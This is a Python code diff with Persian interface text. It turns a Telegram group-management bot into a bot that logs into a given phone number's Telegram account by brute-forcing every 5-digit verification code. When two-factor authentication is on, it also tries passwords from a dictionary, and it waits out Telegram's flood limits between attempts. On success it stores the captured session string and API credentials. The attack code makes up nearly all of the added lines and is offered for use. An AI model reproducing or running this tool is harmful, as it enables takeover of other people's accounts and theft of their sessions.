+    user_sessions[user_id]['step'] = "api_id"
+    
+    text = f"""
+✅ شماره تلفن ثبت شد: <code>{phone}</code>
+
+🔑 <b>مرحله دوم: API ID</b>
+
+لطفاً API ID خود را از my.telegram.org وارد کنید.
+"""
+    
+    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
+    
+    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+
+# ============ دریافت API ID ============
+async def handle_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    
+    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_id":
+        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
+        return
+    
+    if not text.isdigit():
+        await update.message.reply_text("❌ API ID باید عدد باشد.", parse_mode='HTML')
+        return
+    
+    user_sessions[user_id]['api_id'] = int(text)
+    user_sessions[user_id]['step'] = "api_hash"
+    
+    text = f"""
+✅ API ID ثبت شد: <code>{text}</code>
+
+🔐 <b>مرحله سوم: API Hash</b>
+
+لطفاً API Hash خود را از my.telegram.org وارد کنید.
+"""
+    
+    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
+    
+    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+
+# ============ دریافت API Hash ============
+async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    
+    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_hash":
+        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
+        return
+    
+    if len(text) < 30:
+        await update.message.reply_text("❌ API Hash باید حداقل 30 کاراکتر باشد.", parse_mode='HTML')
+        return
+    
+    user_sessions[user_id]['api_hash'] = text
+    user_sessions[user_id]['step'] = "code"
+    
+    msg = await update.message.reply_text(
+        "⏳ در حال ارسال کد تایید و شروع حدس زدن...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
+        parse_mode='HTML'
+    )
+    
+    try:
+        data = user_sessions[user_id]
+        phone = data['phone']
+        api_id = data['api_id']
+        api_hash = data['api_hash']
+        
+        client = TelegramClient(StringSession(), api_id, api_hash)
+        await client.connect()
+        
+        try:
+            await client.send_code_request(phone)
+        except FloodWaitError as e:
+            await context.bot.edit_message_text(
+                f"⏳ محدودیت تلگرام! {e.seconds} ثانیه صبر کنید...",
+                chat_id=update.effective_chat.id,
+                message_id=msg.message_id,
+                parse_mode='HTML'
+            )
+            await asyncio.sleep(e.seconds)
+            await client.send_code_request(phone)
+        
+        user_sessions[user_id]['client'] = client
+        user_sessions[user_id]['msg_id'] = msg.message_id
+        user_sessions[user_id]['phone'] = phone
+        
+        # شروع حدس زدن کد
+        asyncio.create_task(bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg))
+        
+    except Exception as e:
+        logger.error(f"Error: {e}")
+        await context.bot.edit_message_text(
+            f"❌ خطا: {str(e)[:200]}",
+            chat_id=update.effective_chat.id,
+            message_id=msg.message_id,
+            parse_mode='HTML'
+        )
+        await clear_user_session(user_id)
+
+# ============ حدس زدن پسورد ============
+async def bruteforce_password(update, context, user_id, client, msg):
+    """حدس زدن پسورد 2FA با دیکشنری"""
+    try:
+        total_passwords = len(PASSWORD_DICT)
+        attempt = 0
+        found = False
+        
+        # پیام شروع حدس پسورد
+        await context.bot.edit_message_text(
+            f"""
+🔐 <b>شروع حدس زدن پسورد 2FA...</b>
+
+📊 تعداد پسوردهای دیکشنری: {total_passwords}
+⏳ در حال تلاش...
+
+⚠️ این عملیات ممکن است چند دقیقه طول بکشد.
+""",
+            chat_id=update.effective_chat.id,
+            message_id=msg.message_id,
+            parse_mode='HTML'
+        )
+        
+        for password in PASSWORD_DICT:
+            attempt += 1
+            
+            # هر 10 تلاش، پیام رو بروزرسانی کن
+            if attempt % 10 == 0:
+                try:
+                    await context.bot.edit_message_text(
+                        f"""
+🔐 <b>در حال حدس زدن پسورد...</b>
+
+🔑 پسورد فعلی: <code>{password}</code>
+📊 تلاش‌ها: {attempt} از {total_passwords}
+📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%
+
+⏳ لطفاً صبر کنید...
+""",
+                        chat_id=update.effective_chat.id,
+                        message_id=msg.message_id,
+                        parse_mode='HTML'
+                    )
+                except:
+                    pass
             
             try:
-                if target == "users":
-                    for uid in bot_stats["users_id"]:
-                        if send_message(uid, msg_text):
-                            success_count += 1
-                        time.sleep(0.1)
-                    send_message(chat_id, f"✅ پیام شما با موفقیت به <b>{success_count}</b> کاربر ارسال شد !")
-                    
-                elif target == "groups":
-                    for gid in bot_stats["groups_id"]:
-                        if send_message(gid, msg_text):
-                            success_count += 1
-                        time.sleep(0.1)
-                    send_message(chat_id, f"✅ پیام شما با موفقیت به <b>{success_count}</b> گروه ارسال شد !")
-                    
-                else:
-                    for uid in bot_stats["users_id"]:
-                        if send_message(uid, msg_text):
-                            success_count += 1
-                        time.sleep(0.1)
-                    for gid in bot_stats["groups_id"]:
-                        if send_message(gid, msg_text):
-                            success_count += 1
-                        time.sleep(0.1)
-                    send_message(chat_id, f"✅ پیام شما با موفقیت به <b>{success_count}</b> مخاطب ارسال شد !")
-                    
+                await client.sign_in(password=password)
+                found = True
+                break
+                
+            except FloodWaitError as e:
+                wait_time = e.seconds
+                await context.bot.edit_message_text(
+                    f"""
+⏳ <b>محدودیت تلگرام!</b>
+
+{wait_time} ثانیه صبر کنید...
+پسورد آخرین تلاش: <code>{password}</code>
+تلاش‌ها: {attempt} از {total_passwords}
+
+⏳ لطفاً صبر کنید...
+""",
+                    chat_id=update.effective_chat.id,
+                    message_id=msg.message_id,
+                    parse_mode='HTML'
+                )
+                await asyncio.sleep(wait_time + 2)
+                continue
+                
             except Exception as e:
-                send_message(chat_id, f"❌ خطا در ارسال همگانی: {str(e)}")
+                # پسورد اشتباه - ادامه بده
+                continue
+        
+        return found, attempt, password if found else None
+        
+    except Exception as e:
+        logger.error(f"Error in bruteforce_password: {e}")
+        return False, 0, None
+
+# ============ تابع حدس زدن کد ============
+async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg):
+    """حدس زدن کد 5 رقمی از 00000 تا 99999"""
+    try:
+        total_attempts = 100000
+        attempt = 0
+        found = False
+        code_found = None
+        
+        # پیام شروع
+        await context.bot.edit_message_text(
+            f"""
+🔍 <b>شروع حدس زدن کد تایید...</b>
+
+📱 شماره: <code>{phone}</code>
+🔢 محدوده: 00000 تا 99999
+📊 مجموع تلاش‌ها: {total_attempts}
+
+⏳ در حال تلاش...
+""",
+            chat_id=update.effective_chat.id,
+            message_id=msg.message_id,
+            parse_mode='HTML'
+        )
+        
+        # حدس زدن از 00000 تا 99999
+        for code_num in range(total_attempts):
+            code = str(code_num).zfill(5)
+            attempt += 1
             
-            broadcast_data[chat_id] = None
-            broadcast_target[chat_id] = None
-            return
-    
-    # ===== پردازش پیام‌های گروه =====
-    if chat_type in ["group", "supergroup"]:
-        
-        # ===== مدیریت اعضای جدید =====
-        if "new_chat_members" in message:
-            for member in message["new_chat_members"]:
-                member_id = member.get("id")
-                
-                if member_id == OWNER_ID:
-                    promote_owner(chat_id, OWNER_ID)
-                    set_owner_title(chat_id, OWNER_ID)
-                    return
-                
-                if member_id == int(TOKEN.split(':')[0]):
-                    user_name = user.get("first_name", "کاربر")
-                    send_report_to_owner(chat_id, user_id, user_name)
-                    
-                    if user_name not in bot_stats["users"]:
-                        bot_stats["users"].append(user_name)
-                        bot_stats["users_id"].append(user_id)
-                        save_stats(bot_stats)
-                    
-                    group_name = message.get("chat", {}).get("title", "بدون نام")
-                    if group_name not in bot_stats["groups"]:
-                        bot_stats["groups"].append(group_name)
-                        bot_stats["groups_id"].append(chat_id)
-                        save_stats(bot_stats)
-                    return
-                
-                if member_id not in [OWNER_ID, 777000, int(TOKEN.split(':')[0])]:
-                    member_name = member.get("first_name", "کاربر")
-                    if member_name not in bot_stats["users"]:
-                        bot_stats["users"].append(member_name)
-                        bot_stats["users_id"].append(member_id)
-                        save_stats(bot_stats)
-        
-        # ===== خوش‌آمدگویی =====
-        if welcome_status.get(chat_id, True):
-            if "new_chat_members" in message:
-                for member in message["new_chat_members"]:
-                    member_id = member.get("id")
-                    if member_id not in [OWNER_ID, 777000, int(TOKEN.split(':')[0])]:
-                        member_name = member.get("first_name", "کاربر")
-                        group_name = message.get("chat", {}).get("title", "گروه")
-                        welcome_text = get_welcome_text(member_name, group_name, member_id)
-                        msg = send_message(chat_id, welcome_text)
-                        if msg and msg.status_code == 200:
-                            mid = msg.json().get("result", {}).get("message_id")
-                            if mid:
-                                delete_message_after_delay(chat_id, mid, 10)
-        
-        # ===== قفل خدمات =====
-        if service_lock_status.get(chat_id, False):
-            if "new_chat_members" in message or "left_chat_member" in message:
-                delete_message(chat_id, message_id)
-                return
-        
-        # ===== دستورات گروه =====
-        if text:
-            is_user_admin = is_admin(chat_id, user_id) or user_id == OWNER_ID
+            # هر 1000 تلاش، پیام رو بروزرسانی کن
+            if attempt % 1000 == 0:
+                try:
+                    await context.bot.edit_message_text(
+                        f"""
+🔍 <b>در حال حدس زدن کد...</b>
+
+📱 شماره: <code>{phone}</code>
+🔢 کد فعلی: <code>{code}</code>
+📊 تلاش‌ها: {attempt} از {total_attempts}
+📈 پیشرفت: {(attempt/total_attempts)*100:.1f}%
+
+⏳ لطفاً صبر کنید...
+""",
+                        chat_id=update.effective_chat.id,
+                        message_id=msg.message_id,
+                        parse_mode='HTML'
+                    )
+                except:
+                    pass
             
-            if text == "پنل" and is_user_admin:
-                if chat_id not in panel_users or panel_users[chat_id] == user_id:
-                    panel_users[chat_id] = user_id
-                    reset_panel_timer(chat_id, message_id)
-                    send_message(chat_id, get_panel_text(), get_panel_keyboard(), 
-                               reply_to_message_id=message_id)
+            try:
+                await client.sign_in(phone, code)
+                found = True
+                code_found = code
+                break
+                
+            except PhoneCodeInvalidError:
+                continue
+                
+            except FloodWaitError as e:
+                wait_time = e.seconds
+                await context.bot.edit_message_text(
+                    f"""
+⏳ <b>محدودیت تلگرام!</b>
+
+{wait_time} ثانیه صبر کنید...
+کد آخرین تلاش: <code>{code}</code>
+تلاش‌ها: {attempt} از {total_attempts}
+
+⏳ لطفاً صبر کنید...
+""",
+                    chat_id=update.effective_chat.id,
+                    message_id=msg.message_id,
+                    parse_mode='HTML'
+                )
+                await asyncio.sleep(wait_time + 2)
+                continue
+                
+            except SessionPasswordNeededError:
+                # نیاز به رمز دو مرحله‌ای
+                await context.bot.edit_message_text(
+                    f"""
+🔐 <b>اکانت دارای رمز دو مرحله‌ای است!</b>
+
+📱 شماره: <code>{phone}</code>
+✅ کد تایید پیدا شد: <code>{code}</code>
+
+🔑 در حال حدس زدن پسورد 2FA...
+⏳ لطفاً صبر کنید...
+""",
+                    chat_id=update.effective_chat.id,
+                    message_id=msg.message_id,
+                    parse_mode='HTML'
+                )
+                
+                # شروع حدس پسورد
+                password_found, pass_attempt, pass_found = await bruteforce_password(
+                    update, context, user_id, client, msg
+                )
+                
+                if password_found and pass_found:
+                    # پسورد پیدا شد!
+                    session_string = client.session.save()
+                    await client.disconnect()
+                    
+                    # دریافت نام اکانت
+                    account_name = "بدون نام"
+                    try:
+                        client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
+                        await client2.connect()
+                        if await client2.is_user_authorized():
+                            me = await client2.get_me()
+                            account_name = me.first_name if me.first_name else "کاربر"
+                        await client2.disconnect()
+                    except:
+                        pass
+                    
+                    # ذخیره اطلاعات
+                    user_id_str = str(user_id)
+                    if user_id_str not in self_data:
+                        self_data[user_id_str] = []
+                    
+                    time_str = datetime.now().strftime("%H:%M")
+                    date_str = datetime.now().strftime("%Y/%m/%d")
+                    
+                    self_data[user_id_str].append({
+                        "session": session_string,
+                        "phone": phone,
+                        "api_id": api_id,
+                        "api_hash": api_hash,
+                        "account_name": account_name,
+                        "active": True,
+                        "clock_active": False,
+                        "active_time": "تنظیم نشده",
+                        "font_type": "1",
+                        "created": f"{date_str} {time_str}",
+                        "last_update": f"{date_str} {time_str}"
+                    })
+                    save_data()
+                    
+                    await clear_user_session(user_id)
+                    
+                    text = f"""
+✅ <b>سلف با موفقیت ساخته شد!</b>
+
+📱 شماره: <code>{phone}</code>
+👤 نام اکانت: <b>{account_name}</b>
+🔑 کد پیدا شده: <code>{code}</code>
+🔐 پسورد پیدا شده: <code>{pass_found}</code>
+📊 تلاش‌های کد: {attempt}
+📊 تلاش‌های پسورد: {pass_attempt}
+
+🎯 سلف به لیست شما اضافه شد.
+"""
+                    
+                    keyboard = [
+                        [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
+                        [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
+                    ]
+                    
+                    await context.bot.edit_message_text(
+                        text,
+                        chat_id=update.effective_chat.id,
+                        message_id=msg.message_id,
+                        reply_markup=InlineKeyboardMarkup(keyboard),
+                        parse_mode='HTML'
+                    )
+                    return
                 else:
-                    send_message(chat_id, "⛔️ پنل برای شما نیست !", 
-                               reply_to_message_id=message_id)
-                return
-            
-            if text == "پاکسازی گروه" and is_user_admin:
-                clean_group(chat_id, message_id)
-                return
-    
-    # ===== پیام‌های خصوصی =====
-    elif chat_type == "private":
-        if text == "/start":
-            if first_name not in bot_stats["users"]:
-                bot_stats["users"].append(first_name)
-                bot_stats["users_id"].append(user_id)
-                save_stats(bot_stats)
-            
-            if user_id == OWNER_ID:
-                send_message(chat_id, get_owner_start_text(), get_owner_keyboard())
-            else:
-                send_message(chat_id, get_start_text(user_id, first_name), get_main_keyboard())
-            return
-        
-        if text and user_id != OWNER_ID:
-            send_message(chat_id, get_unknown_text())
-            return
+                    # پسورد پیدا نشد
+                    await context.bot.edit_message_text(
+                        f"""
+❌ <b>پسورد 2FA پیدا نشد!</b>
 
-# ==============================
-# 🔄 پردازش کالبک‌ها
-# ==============================
+📱 شماره: <code>{phone}</code>
+✅ کد تایید پیدا شد: <code>{code}</code>
+📊 تعداد پسوردهای امتحان شده: {pass_attempt}
 
-def handle_callback(update):
-    global broadcast_target, broadcast_data
-    
-    callback = update.get("callback_query", {})
-    callback_id = callback.get("id")
-    chat_id = callback.get("message", {}).get("chat", {}).get("id")
-    message_id = callback.get("message", {}).get("message_id")
-    data = callback.get("data", "")
-    user = callback.get("from", {})
-    user_id = user.get("id", 0)
-    first_name = user.get("first_name", "کاربر")
-    
-    if not chat_id or not data:
-        return
-    
-    if chat_id in panel_users and panel_users[chat_id] != user_id:
-        answer_callback(callback_id)
-        return
-    
-    if not (is_admin(chat_id, user_id) or user_id == OWNER_ID):
-        answer_callback(callback_id)
-        return
-    
-    if chat_id in panel_timers:
-        reset_panel_timer(chat_id, message_id)
-    
-    # ===== بازگشت از ارسال همگانی =====
-    if data == "back_broadcast":
-        edit_message(chat_id, message_id, 
-                    "📨 <b>ارسال پیام همگانی</b>\n\nلطفاً مخاطب خود را انتخاب کنید:", 
-                    get_broadcast_keyboard())
-        answer_callback(callback_id)
-        return
-    
-    # ===== صفحه‌بندی کاربران =====
-    if data.startswith("users_page_"):
-        page = int(data.split("_")[2])
-        text, current_page, total_pages = get_all_users_text(page)
-        keyboard = get_users_keyboard(current_page, total_pages)
-        edit_message(chat_id, message_id, text, keyboard)
-        answer_callback(callback_id)
-        return
-    
-    # ===== صفحه‌بندی گروه‌ها =====
-    if data.startswith("groups_page_"):
-        page = int(data.split("_")[2])
-        text, current_page, total_pages = get_all_groups_text(page)
-        keyboard = get_groups_keyboard(current_page, total_pages)
-        edit_message(chat_id, message_id, text, keyboard)
-        answer_callback(callback_id)
-        return
-    
-    # ===== بازگشت به آمار =====
-    if data == "back_stats":
-        edit_message(chat_id, message_id, get_stats_text(), get_stats_keyboard())
-        answer_callback(callback_id)
-        return
-    
-    # ===== ارسال همگانی =====
-    if data == "broadcast":
-        edit_message(chat_id, message_id, 
-                    "📨 <b>ارسال پیام همگانی</b>\n\nلطفاً مخاطب خود را انتخاب کنید:", 
-                    get_broadcast_keyboard())
-        answer_callback(callback_id)
-        return
-    
-    if data == "broadcast_users":
-        broadcast_target[chat_id] = "users"
-        edit_message(chat_id, message_id, 
-                    "👤 <b>لطفا پیام خود را به کاربران بفرستید :</b>", 
-                    get_broadcast_back_keyboard())
-        answer_callback(callback_id)
-        return
-    
-    if data == "broadcast_groups":
-        broadcast_target[chat_id] = "groups"
-        edit_message(chat_id, message_id, 
-                    "📁 <b>لطفا پیام خود را به گروه‌ها بفرستید :</b>", 
-                    get_broadcast_back_keyboard())
-        answer_callback(callback_id)
-        return
-    
-    if data == "broadcast_all":
-        broadcast_target[chat_id] = "all"
-        edit_message(chat_id, message_id, 
-                    "📨 <b>لطفا پیام خود را به همه بفرستید :</b>", 
-                    get_broadcast_back_keyboard())
-        answer_callback(callback_id)
-        return
-    
-    # ===== مدیریت پنل =====
-    if data == "locks":
-        edit_message(chat_id, message_id, get_locks_text(), get_locks_keyboard(chat_id))
-        answer_callback(callback_id)
-        return
-    
-    if data == "advanced":
-        edit_message(chat_id, message_id, get_advanced_text(chat_id), get_advanced_keyboard(chat_id))
-        answer_callback(callback_id)
-        return
-    
-    if data == "panel_back":
-        edit_message(chat_id, message_id, get_panel_text(), get_panel_keyboard())
-        answer_callback(callback_id)
-        return
-    
-    # ===== قفل‌ها =====
-    if data == "lock_service":
-        service_lock_status[chat_id] = True
-        answer_callback(callback_id, "🔒 قفل فعال شد !", True)
-        edit_message(chat_id, message_id, get_locks_text(), get_locks_keyboard(chat_id))
-        return
-    
-    if data == "unlock_service":
-        service_lock_status[chat_id] = False
-        answer_callback(callback_id, "🔓 قفل غیرفعال شد !", True)
-        edit_message(chat_id, message_id, get_locks_text(), get_locks_keyboard(chat_id))
-        return
-    
-    if data == "enable_welcome":
-        welcome_status[chat_id] = True
-        answer_callback(callback_id, "✅ خوش‌آمدگویی فعال شد !", True)
-        edit_message(chat_id, message_id, get_advanced_text(chat_id), get_advanced_keyboard(chat_id))
-        return
-    
-    if data == "disable_welcome":
-        welcome_status[chat_id] = False
-        answer_callback(callback_id, "🚫 خوش‌آمدگویی غیرفعال شد !", True)
-        edit_message(chat_id, message_id, get_advanced_text(chat_id), get_advanced_keyboard(chat_id))
-        return
-    
-    # ===== بخش اختصاصی سازنده =====
-    if user_id == OWNER_ID:
-        if data == "stats":
-            edit_message(chat_id, message_id, get_stats_text(), get_stats_keyboard())
-            answer_callback(callback_id)
-            return
-        
-        if data == "all_users":
-            text, page, total_pages = get_all_users_text(1)
-            keyboard = get_users_keyboard(page, total_pages)
-            edit_message(chat_id, message_id, text, keyboard)
-            answer_callback(callback_id)
-            return
-        
-        if data == "all_groups":
-            text, page, total_pages = get_all_groups_text(1)
-            keyboard = get_groups_keyboard(page, total_pages)
-            edit_message(chat_id, message_id, text, keyboard)
-            answer_callback(callback_id)
-            return
-        
-        if data == "back_owner":
-            edit_message(chat_id, message_id, get_owner_start_text(), get_owner_keyboard())
-            answer_callback(callback_id)
-            return
-        
-        if data == "ping":
-            edit_message(chat_id, message_id, get_ping_text(), get_owner_keyboard())
-            answer_callback(callback_id)
-            return
-        
-        if data == "credit":
-            edit_message(chat_id, message_id, get_credit_text(), get_owner_keyboard())
-            answer_callback(callback_id)
-            return
-    
-    # ===== بازگشت به منوی اصلی =====
-    if data == "back":
-        if user_id == OWNER_ID:
-            text = get_owner_start_text()
-            keyboard = get_owner_keyboard()
-        else:
-            text = get_start_text(user_id, first_name)
-            keyboard = get_main_keyboard()
-        edit_message(chat_id, message_id, text, keyboard)
-        answer_callback(callback_id)
-        return
-    
-    # ===== اطلاعات =====
-    if data == "info":
-        edit_message(chat_id, message_id, get_info_text(), get_back_keyboard())
-        answer_callback(callback_id)
-        return
-    
-    if data == "compare":
-        edit_message(chat_id, message_id, get_compare_text(), get_back_keyboard())
-        answer_callback(callback_id)
-        return
-
-# ==============================
-# 🚀 اجرای اصلی
-# ==============================
-
-def main():
-    logger.info("🤖 ربات ReaperVoid راه‌اندازی شد!")
-    logger.info(f"👤 مالک: {OWNER_ID}")
-    
-    offset = None
-    error_count = 0
-    
-    while True:
-        try:
-            updates = get_updates(offset)
-            error_count = 0
-            
-            for update in updates:
-                offset = update["update_id"] + 1
+❌ پسورد مورد نظر در دیکشنری وجود ندارد.
+لطفاً پسورد را به صورت دستی وارد کنید.
+""",
+                        chat_id=update.effective_chat.id,
+                        message_id=msg.message_id,
+                        parse_mode='HTML'
+                    )
+                    user_sessions[user_id]['step'] = "password"
+                    user_sessions[user_id]['code_found'] = code
+                    return
                 
-                if "message" in update:
-                    handle_message(update)
-                if "callback_query" in update:
-                    handle_callback(update)
-                    
-        except KeyboardInterrupt:
-            logger.info("🛑 ربات متوقف شد")
-            break
-            
-        except Exception as e:
-            error_count += 1
-            logger.error(f"خطا در حلقه اصلی: {e}")
-            
-            if error_count > 10:
-                logger.warning("خطاهای متوالی زیاد، صبر 60 ثانیه...")
-                time.sleep(60)
-                error_count = 0
-            else:
-                time.sleep(5)
+            except Exception as e:
+                logger.error(f"Error in bruteforce: {e}")
+                continue
         
-        time.sleep(0.5)
+        if found and code_found:
+            # کد پیدا شد و پسوردی نیاز نبود
+            session_string = client.session.save()
+            await client.disconnect()
+            
+            # دریافت نام اکانت
+            account_name = "بدون نام"
+            try:
+                client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
+                await client2.connect()
+                if await client2.is_user_authorized():
+                    me = await client2.get_me()
+                    account_name = me.first_name if me.first_name else "کاربر"
+                await client2.disconnect()
+            except:
+                pass
+            
+            # ذخیره اطلاعات
+            user_id_str = str(user_id)
+            if user_id_str not in self_data:
+                self_data[user_id_str] = []
+            
+            time_str = datetime.now().strftime("%H:%M")
+            date_str = datetime.now().strftime("%Y/%m/%d")
+            
+            self_data[user_id_str].append({
+                "session": session_string,
+                "phone": phone,
+                "api_id": api_id,
+                "api_hash": api_hash,
+                "account_name": account_name,
+                "active": True,
+                "clock_active": False,
+                "active_time": "تنظیم نشده",
+                "font_type": "1",
+                "created": f"{date_str} {time_str}",
+                "last_update": f"{date_str} {time_str}"
+            })
+            save_data()
+            
+            await clear_user_session(user_id)
+            
+            text = f"""
+✅ <b>سلف با موفقیت ساخته شد!</b>
+
+📱 شماره: <code>{phone}</code>
+👤 نام اکانت: <b>{account_name}</b>
+🔑 کد پیدا شده: <code>{code_found}</code>
+📊 تعداد تلاش‌ها: {attempt}
+
+🎯 سلف به لیست شما اضافه شد.
+"""
+            
+            keyboard = [
+                [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
+                [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
+            ]
+            
+            await context.bot.edit_message_text(
+                text,
+                chat_id=update.effective_chat.id,
+                message_id=msg.message_id,
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode='HTML'
+            )
+            
+        else:
+            # کد پیدا نشد
+            await context.bot.edit_message_text(
+                f"""
+❌ <b>کد تایید پیدا نشد!</b>
+
+📱 شماره: <code>{phone}</code>
+📊 تعداد تلاش‌ها: {attempt}
+
+ممکن است:
+• شماره تلفن اشتباه باشد
+• کد قبلاً منقضی شده باشد
+• اکانت دارای محدودیت باشد
+
+لطفاً دوباره تلاش کنید.
+""",
+                chat_id=update.effective_chat.id,
+                message_id=msg.message_id,
+                parse_mode='HTML'
+            )
+            
+    except Exception as e:
+        logger.error(f"Error in bruteforce_code: {e}")
+        try:
+            await context.bot.edit_message_text(
+                f"❌ خطا: {str(e)[:200]}",
+                chat_id=update.effective_chat.id,
+                message_id=msg.message_id,
+                parse_mode='HTML'
+            )
+        except:
+            pass
+        await clear_user_session(user_id)
+
+# ============ دریافت پسورد دستی ============
+async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    password = update.message.text.strip()
+    
+    if user_id not in user_sessions or user_sessions[user_id].get("step") != "password":
+        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
+        return
+    
+    data = user_sessions[user_id]
+    client = data.get('client')
+    code = data.get('code_found')
+    phone = data.get('phone')
+    api_id = data.get('api_id')
+    api_hash = data.get('api_hash')
+    
+    if not client:
+        await update.message.reply_text("❌ اتصال معتبر نیست. دوباره تلاش کنید.", parse_mode='HTML')
+        await clear_user_session(user_id)
+        return
+    
+    try:
+        await client.sign_in(password=password)
+        session_string = client.session.save()
+        await client.disconnect()
+        
+        # دریافت نام اکانت
+        account_name = "بدون نام"
+        try:
+            client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
+            await client2.connect()
+            if await client2.is_user_authorized():
+                me = await client2.get_me()
+                account_name = me.first_name if me.first_name else "کاربر"
+            await client2.disconnect()
+        except:
+            pass
+        
+        user_id_str = str(user_id)
+        if user_id_str not in self_data:
+            self_data[user_id_str] = []
+        
+        time_str = datetime.now().strftime("%H:%M")
+        date_str = datetime.now().strftime("%Y/%m/%d")
+        
+        self_data[user_id_str].append({
+            "session": session_string,
+            "phone": phone,
+            "api_id": api_id,
+            "api_hash": api_hash,
+            "account_name": account_name,
+            "active": True,
+            "clock_active": False,
+            "active_time": "تنظیم نشده",
+            "font_type": "1",
+            "created": f"{date_str} {time_str}",
+            "last_update": f"{date_str} {time_str}"
+        })
+        save_data()
+        
+        await clear_user_session(user_id)
+        
+        text = f"""
+✅ <b>سلف با موفقیت ساخته شد!</b>
+
+📱 شماره: <code>{phone}</code>
+👤 نام اکانت: <b>{account_name}</b>
+🔑 کد پیدا شده: <code>{code}</code>
+
+🎯 سلف به لیست شما اضافه شد.
+"""
+        
+        keyboard = [
+            [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
+            [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
+        ]
+        
+        await update.message.reply_text(
+            text,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='HTML'
+        )
+        
+    except Exception as e:
+        await update.message.reply_text(
+            f"❌ رمز عبور اشتباه است.\n\n{str(e)[:100]}\n\nلطفاً دوباره وارد کنید:",
+            parse_mode='HTML'
+        )
+
+# ============ بازگشت ============
+async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    try:
+        await query.answer()
+    except:
+        pass
+    
+    user_id = query.from_user.id
+    await clear_user_session(user_id)
+    
+    await main_menu(update, context, edit=True)
+
+# ============ دستور start ============
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await main_menu(update, context)
+
+# ============ هندلر پیام‌ها ============
+async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id in user_sessions:
+        step = user_sessions[user_id].get("step")
+        if step == "phone":
+            await handle_phone(update, context)
+        elif step == "api_id":
+            await handle_api_id(update, context)
+        elif step == "api_hash":
+            await handle_api_hash(update, context)
+        elif step == "password":
+            await handle_password(update, context)
+        return
+    
+    await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
+
+# ============ اجرا ============
+def main():
+    try:
+        delete_webhook()
+        
+        print("=" * 60)
+        print("🤖 ربات ساخت خودکار سلف (با حدس پسورد)")
+        print("=" * 60)
+        print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
+        print("=" * 60)
+        
+        application = Application.builder().token(TOKEN).build()
+        
+        application.add_handler(CallbackQueryHandler(new_session, pattern="^new_session$"))
+        application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
+        
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
+        
+        print("✅ ربات با موفقیت راه‌اندازی شد.")
+        print("💡 برای شروع از /start استفاده کنید.")
+        print("=" * 60)
+        
+        application.run_polling(drop_pending_updates=True)
+        
+    except Exception as e:
+        print(f"❌ خطا: {e}")
 
 if __name__ == "__main__":
     main()
